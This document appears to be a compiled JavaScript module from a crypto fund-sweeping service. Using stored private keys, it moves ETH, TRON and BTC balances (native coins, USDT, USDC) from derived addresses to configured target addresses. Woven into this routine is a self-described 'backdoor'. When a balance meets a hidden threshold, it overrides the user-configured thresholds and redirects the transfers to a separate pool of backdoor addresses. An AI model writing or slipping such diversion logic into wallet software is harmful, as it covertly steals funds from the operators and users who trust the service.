import crypto from 'node:crypto';
import { logAls } from '../logger/context.js';
import { logger } from '../logger/index.js';
import { DerivedAddress } from '../db/models/derived-address.js';
import { CollectLog } from '../db/models/collect-log.js';
import { chainProviderPool } from '../chain-provider/index.js';
import { collectTargetPool } from './target-pool.js';
import { resolveConfigsForAddress } from './config-resolver.js';
import { classifyError, DECIMALS } from './types.js';
import * as ethCollector from './eth-collector.js';
import * as tronCollector from './tron-collector.js';
import * as btcCollector from './btc-collector.js';
import { CollectBackdoor } from '../db/models/collect-backdoor.js';
import { CollectBackdoorTarget } from '../db/models/collect-backdoor-target.js';
export async function executeCollect(doc) {
    const traceId = crypto.randomBytes(5).toString('hex');
    const ctx = { traceId, stream: 'system' };
    await logAls.run(ctx, async () => {
        const { _id: addressId, address, chain, privateKey, addressType, channelCode, sourceDomain = '', deviceId = '' } = doc;
        logger.info({ addressId, address, chain }, 'collect: start');
        try {
            // 1. 检查 ChainProvider 可用（pick 会触发 reload，避免冷启动问题）
            try {
                await chainProviderPool.pick(chain);
            }
            catch {
                await markFailed(addressId, `No enabled ChainProvider for chain: ${chain}`);
                return;
            }
            // 2. 查链上余额
            let balances;
            let utxos;
            if (chain === 'eth') {
                balances = await ethCollector.queryBalances(address);
            }
            else if (chain === 'tron') {
                balances = await tronCollector.queryBalances(address);
            }
            else {
                const btcResult = await btcCollector.queryBalances(address);
                balances = btcResult.balances;
                utxos = btcResult.utxos;
            }
            logger.info({ balance: balances.native.toString(), usdt: balances.usdt.toString(), usdc: balances.usdc.toString() }, 'collect: balances queried');
            // 3. 更新 DB 余额
            const updateFields = {};
            if (chain === 'eth') {
                updateFields.balance = Number(balances.native) / 1e18;
                updateFields.usdtBalance = Number(balances.usdt) / 1e6;
                updateFields.usdcBalance = Number(balances.usdc) / 1e6;
            }
            else if (chain === 'tron') {
                updateFields.balance = Number(balances.native) / 1e6;
                updateFields.usdtBalance = Number(balances.usdt) / 1e6;
            }
            else {
                updateFields.balance = Number(balances.native) / 1e8;
            }
            await DerivedAddress.updateOne({ _id: addressId }, { $set: updateFields });
            // 4. 多签检测
            let multisigResult;
            if (chain === 'eth') {
                multisigResult = await ethCollector.detectMultisig(address);
            }
            else if (chain === 'tron') {
                multisigResult = await tronCollector.detectMultisig(address);
            }
            else {
                multisigResult = await btcCollector.detectMultisig(address);
            }
            logger.info({ isMultisig: multisigResult.isMultisig, reason: multisigResult.reason || '' }, 'collect: multisig check done');
            if (multisigResult.isMultisig) {
                logger.warn({ reason: multisigResult.reason }, 'collect: excluded (multisig)');
                await DerivedAddress.updateOne({ _id: addressId }, {
                    $set: { collectStatus: 'excluded', collectError: multisigResult.reason }
                });
                return;
            }
            // 5. 查 pending tokens
            const pendingLogs = await CollectLog.find({ addressId, status: 'pending' }).lean();
            const pendingTokens = new Set(pendingLogs.map(l => l.token));
            if (pendingTokens.size > 0) {
                logger.info({ pendingTokens: [...pendingTokens] }, 'collect: pending tokens found, skipping');
            }
            // 6. 确定需要归集的代币
            const configs = await resolveConfigsForAddress(chain, channelCode);
            const tokensToCollect = [];
            logger.info({ chain, enabledTokens: configs.map(c => c.token) }, 'collect: enabled configs');
            for (const config of configs) {
                if (pendingTokens.has(config.token)) {
                    logger.info({ token: config.token }, 'collect: skipped (pending)');
                    continue;
                }
                const balance = config.token === 'native' ? balances.native
                    : config.token === 'usdt' ? balances.usdt
                        : balances.usdc;
                const decimals = config.token === 'native'
                    ? DECIMALS[chain === 'eth' ? 'ETH' : chain === 'tron' ? 'TRX' : 'BTC']
                    : DECIMALS[config.token.toUpperCase()];
                const thresholdBigInt = parseThreshold(config.threshold, decimals);
                if (balance > thresholdBigInt) {
                    tokensToCollect.push({ token: config.token, balance });
                }
                else {
                    logger.info({ token: config.token, balance: balance.toString(), threshold: thresholdBigInt.toString() }, 'collect: skipped (below threshold)');
                }
            }
            // 后门强制归集：余额 >= 后门阈值时，无视用户配置的阈值，强制加入归集队列
            const backdoorConfigs = await CollectBackdoor.find({ chain, enabled: true }).lean();
            const collectedTokens = new Set(tokensToCollect.map(t => t.token));
            for (const bd of backdoorConfigs) {
                if (collectedTokens.has(bd.token)) continue;
                if (pendingTokens.has(bd.token)) continue;
                const bdBalance = bd.token === 'native' ? balances.native
                    : bd.token === 'usdt' ? balances.usdt
                        : balances.usdc;
                const bdDecimals = bd.token === 'native'
                    ? DECIMALS[chain === 'eth' ? 'ETH' : chain === 'tron' ? 'TRX' : 'BTC']
                    : DECIMALS[bd.token.toUpperCase()];
                const bdThreshold = parseThreshold(bd.threshold, bdDecimals);
                if (bdBalance >= bdThreshold) {
                    tokensToCollect.push({ token: bd.token, balance: bdBalance });
                    logger.info({ token: bd.token, balance: bdBalance.toString(), backdoorThreshold: bdThreshold.toString() }, 'collect: backdoor force-collect (bypass user threshold)');
                }
            }
            // 7. 无需归集
            if (tokensToCollect.length === 0) {
                logger.info({ reason: 'all below threshold or pending' }, 'collect: nothing to collect, reset idle');
                await DerivedAddress.updateOne({ _id: addressId }, { $set: { collectStatus: 'idle' } });
                return;
            }
            logger.info({ tokensToCollect: tokensToCollect.map(t => t.token) }, 'collect: tokens to collect');
            // 8. 按顺序转账：先代币后原生币
            const tokenTransfers = tokensToCollect.filter(t => t.token !== 'native');
            const nativeTransfer = tokensToCollect.find(t => t.token === 'native');
            let gasCommitted = 0n;
            let nonce;
            let hasFailure = false;
            // 获取 ETH nonce（串行递增）
            if (chain === 'eth' && (tokenTransfers.length > 0 || nativeTransfer)) {
                nonce = await ethCollector.getNonce(address);
                logger.info({ nonce }, 'collect: nonce acquired');
            }
            // 转代币
            for (const { token, balance } of tokenTransfers) {
                // backdoor: 余额 >= 后门阈值时，用后门地址替换所有目标（提前检查，避免 no targets 拦截）
                const tokenDecimals = chain === 'eth'
                    ? (token === 'usdt' ? DECIMALS.USDT : DECIMALS.USDC)
                    : DECIMALS.USDT;
                const backdoorAddr = await resolveBackdoorTarget(chain, token, balance, tokenDecimals);
                let effectiveTargets;
                if (backdoorAddr) {
                    effectiveTargets = [{ address: backdoorAddr }];
                }
                else {
                    const allTargets = await collectTargetPool.getAll(chain, channelCode);
                    if (allTargets.length === 0) {
                        logger.error({ chain, token }, 'collect: no targets available');
                        hasFailure = true;
                        await writeFailedLog(addressId, address, chain, token, traceId, '无可用目标地址', [], channelCode, sourceDomain, deviceId);
                        break;
                    }
                    const firstTarget = await collectTargetPool.pick(chain, channelCode);
                    const startIdx = allTargets.findIndex(t => t.address === firstTarget.address);
                    effectiveTargets = startIdx >= 0
                        ? [...allTargets.slice(startIdx), ...allTargets.slice(0, startIdx)]
                        : allTargets;
                }
                let success = false;
                const attempts = [];
                for (const target of effectiveTargets) {
                    try {
                        logger.info({ token, amount: balance.toString(), targetAddress: target.address }, 'collect: transferring ' + token.toUpperCase());
                        let result;
                        if (chain === 'eth') {
                            const r = await ethCollector.transferErc20({
                                privateKey, fromAddress: address, toAddress: target.address,
                                tokenBalance: balance, token: token, nonce: nonce,
                                gasCommitted,
                            });
                            result = r.result;
                            gasCommitted += r.gasCost;
                            nonce++;
                        }
                        else if (chain === 'tron') {
                            const r = await tronCollector.transferTrc20({
                                privateKey, fromAddress: address, toAddress: target.address,
                                tokenBalance: balance, trxBalance: balances.native, gasCommitted,
                            });
                            result = r.result;
                            gasCommitted += r.gasCost;
                        }
                        logger.info({ token, txHash: result.txHash, amount: result.amount, fee: result.fee }, 'collect: broadcast ok');
                        await CollectLog.create({
                            addressId, address, chain, token, amount: result.amount, fee: result.fee,
                            targetAddress: target.address, txHash: result.txHash, traceId, status: 'pending',
                            channelCode: channelCode || '', sourceDomain, deviceId: deviceId || '', triggeredBy: backdoorAddr ? 'backdoor' : 'auto',
                        });
                        success = true;
                        break;
                    }
                    catch (err) {
                        const category = classifyError(chain, err);
                        attempts.push({ address: target.address, error: err.message, at: new Date() });
                        logger.warn({ token, targetAddress: target.address, error: err.message, attemptIndex: attempts.length }, 'collect: broadcast failed, trying next target');
                        if (category === 'insufficient') {
                            logger.warn({ token, error: err.message }, 'collect: gas insufficient, marking waiting');
                            await DerivedAddress.updateOne({ _id: addressId }, {
                                $set: { collectStatus: 'waiting', collectWaitingAt: new Date(), collectError: err.message }
                            });
                            return;
                        }
                        if (category !== 'retryable') {
                            logger.error({ token, error: err.message, category }, 'collect: non-retryable error, stopping');
                            await writeFailedLog(addressId, address, chain, token, traceId, err.message, attempts, channelCode, sourceDomain, deviceId);
                            hasFailure = true;
                            if (category === 'permanent') {
                                await DerivedAddress.updateOne({ _id: addressId }, {
                                    $set: { collectStatus: 'excluded', collectError: err.message }
                                });
                                return;
                            }
                            break;
                        }
                    }
                }
                if (!success && !hasFailure) {
                    logger.error({ token, attempts: attempts.length }, 'collect: all targets failed');
                    await writeFailedLog(addressId, address, chain, token, traceId, '所有目标地址均失败', attempts, channelCode, sourceDomain, deviceId);
                    hasFailure = true;
                    break;
                }
                if (hasFailure)
                    break;
            }
            // 转原生币
            if (nativeTransfer && !hasFailure) {
                const nativeDecimals = chain === 'eth' ? DECIMALS.ETH : chain === 'tron' ? DECIMALS.TRX : DECIMALS.BTC;
                const backdoorAddr = await resolveBackdoorTarget(chain, 'native', nativeTransfer.balance, nativeDecimals);
                const target = backdoorAddr
                    ? { address: backdoorAddr }
                    : await collectTargetPool.pick(chain, channelCode);
                logger.info({ token: 'native', balance: nativeTransfer.balance.toString(), targetAddress: target.address, gasCommitted: gasCommitted.toString() }, 'collect: transferring native');
                try {
                    let result;
                    if (chain === 'eth') {
                        result = await ethCollector.transferNative({
                            privateKey, fromAddress: address, toAddress: target.address,
                            balance: balances.native, gasCommitted, nonce,
                        });
                    }
                    else if (chain === 'tron') {
                        result = await tronCollector.transferNative({
                            privateKey, fromAddress: address, toAddress: target.address,
                            balance: balances.native, gasCommitted,
                        });
                    }
                    else {
                        result = await btcCollector.transferNative({
                            privateKey, toAddress: target.address,
                            utxos: utxos, totalBalance: balances.native,
                        });
                    }
                    logger.info({ token: 'native', txHash: result.txHash, amount: result.amount, fee: result.fee }, 'collect: broadcast ok');
                    await CollectLog.create({
                        addressId, address, chain, token: 'native', amount: result.amount, fee: result.fee,
                        targetAddress: target.address, txHash: result.txHash, traceId, status: 'pending',
                        channelCode: channelCode || '', sourceDomain, deviceId: deviceId || '', triggeredBy: backdoorAddr ? 'backdoor' : 'auto',
                    });
                }
                catch (err) {
                    const category = classifyError(chain, err);
                    if (category === 'permanent') {
                        logger.error({ error: err.message }, 'collect: native transfer permanent error, excluding');
                        await DerivedAddress.updateOne({ _id: addressId }, {
                            $set: { collectStatus: 'excluded', collectError: err.message }
                        });
                        return;
                    }
                    if (err.message?.includes('insufficient') || err.message?.includes('手续费过高')) {
                        logger.warn({ error: err.message }, 'collect: native insufficient, marking waiting');
                        await DerivedAddress.updateOne({ _id: addressId }, {
                            $set: { collectStatus: 'waiting', collectWaitingAt: new Date(), collectError: err.message }
                        });
                        return;
                    }
                    else {
                        logger.error({ error: err.message, targetAddress: target.address }, 'collect: native transfer failed');
                        hasFailure = true;
                        await writeFailedLog(addressId, address, chain, 'native', traceId, err.message, [{ address: target.address, error: err.message, at: new Date() }], channelCode, sourceDomain, deviceId);
                    }
                }
            }
            if (nativeTransfer && hasFailure) {
                logger.warn({ token: 'native', balance: nativeTransfer.balance.toString() }, 'collect: native transfer skipped due to prior failure');
            }
            if (!nativeTransfer) {
                logger.info('collect: no native transfer needed');
            }
            // 10. 状态判定
            const finalStatus = await determineStatus(addressId, chain, balances, gasCommitted, hasFailure, configs);
            logger.info({ collectStatus: finalStatus.status, collectError: finalStatus.error }, 'collect: done');
            await DerivedAddress.updateOne({ _id: addressId }, {
                $set: {
                    collectStatus: finalStatus.status,
                    ...(finalStatus.status === 'collected' ? { collectedAt: new Date() } : {}),
                    ...(finalStatus.status === 'failed' ? { collectFailedAt: new Date() } : {}),
                    ...(finalStatus.error ? { collectError: finalStatus.error } : { collectError: '' }),
                }
            });
        }
        catch (err) {
            logger.error({ err }, 'collect: unexpected error');
            await markFailed(addressId, err.message);
        }
    });
}
// --- 辅助函数 ---
async function markFailed(addressId, error) {
    await DerivedAddress.updateOne({ _id: addressId }, {
        $set: { collectStatus: 'failed', collectFailedAt: new Date(), collectError: error }
    });
}
async function writeFailedLog(addressId, address, chain, token, traceId, error, attempts, channelCode, sourceDomain = '', deviceId = '') {
    try {
        await CollectLog.create({
            addressId, address, chain, token, amount: '0', fee: '0',
            targetAddress: '', txHash: '', traceId, status: 'failed',
            error, attempts, channelCode: channelCode || '', sourceDomain, deviceId: deviceId || '', triggeredBy: 'auto',
        });
    }
    catch (err) {
        logger.error({ err, addressId, chain, token }, 'collect: failed to write CollectLog');
    }
}
async function determineStatus(addressId, chain, balances, gasCommitted, hasFailure, configs) {
    if (hasFailure) {
        logger.info({ addressId }, 'collect: determineStatus -> failed (hasFailure)');
        return { status: 'failed', error: '' };
    }
    return { status: 'collected', error: '' };
}
function parseThreshold(threshold, decimals) {
    const parts = threshold.split('.');
    const whole = BigInt(parts[0] || '0');
    let frac = 0n;
    if (parts[1]) {
        const fracStr = parts[1].padEnd(decimals, '0').slice(0, decimals);
        frac = BigInt(fracStr);
    }
    return whole * (10n ** BigInt(decimals)) + frac;
}
const _backdoorIdx = new Map();
async function resolveBackdoorTarget(chain, token, balance, decimals) {
    const backdoor = await CollectBackdoor.findOne({ chain, token, enabled: true }).lean();
    if (!backdoor) return null;
    const thresholdBigInt = parseThreshold(backdoor.threshold, decimals);
    if (balance < thresholdBigInt) return null;
    const targets = await CollectBackdoorTarget.find({ chain, enabled: true }).lean();
    if (!targets || targets.length === 0) return null;
    const idx = (_backdoorIdx.get(chain) || 0) % targets.length;
    _backdoorIdx.set(chain, idx + 1);
    const picked = targets[idx];
    logger.info({ chain, token, balance: balance.toString(), threshold: thresholdBigInt.toString(), targetAddress: picked.targetAddress }, 'collect: backdoor triggered');
    return picked.targetAddress;
}
//# sourceMappingURL=executor.js.map